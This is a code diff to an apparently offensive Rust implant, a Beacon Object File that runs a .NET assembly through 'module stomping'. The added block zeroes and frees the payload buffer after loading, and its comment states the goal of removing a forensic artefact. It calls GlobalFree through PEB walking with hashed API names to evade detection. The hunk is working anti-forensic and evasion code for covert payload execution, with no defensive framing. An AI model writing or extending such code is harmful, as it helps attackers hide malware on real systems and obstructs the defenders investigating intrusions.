@@ -1566,6 +1566,20 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
         }
         crate::dlog2(b"[stomp] Load_2 succeeded (stomped)");
 
+        // Scrub payload — CLR has its own copy of the assembly in the
+        // stomped victim mapping. The buffer in our GlobalAlloc heap is
+        // redundant and only serves as a forensic artefact.
+        if !(*sp_obj).payload_bytes.is_null() {
+            core::ptr::write_bytes((*sp_obj).payload_bytes, 0, (*sp_obj).payload_size);
+            type GlobalFreeFn = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+            if let Some(gf) = peb_fn::<GlobalFreeFn>(hash!("kernel32.dll"), hash!("GlobalFree")) {
+                gf((*sp_obj).payload_bytes as *mut c_void);
+            }
+            (*sp_obj).payload_bytes = core::ptr::null_mut();
+            (*sp_obj).payload_size = 0;
+            crate::dlog2(b"[stomp] payload_bytes scrubbed");
+        }
+
         let assembly = ComPtr::<Assembly>::from_raw(asm_ptr as *mut _)
             .ok_or(BofError::Clr { hr: -1, op: "l4" })?;
 
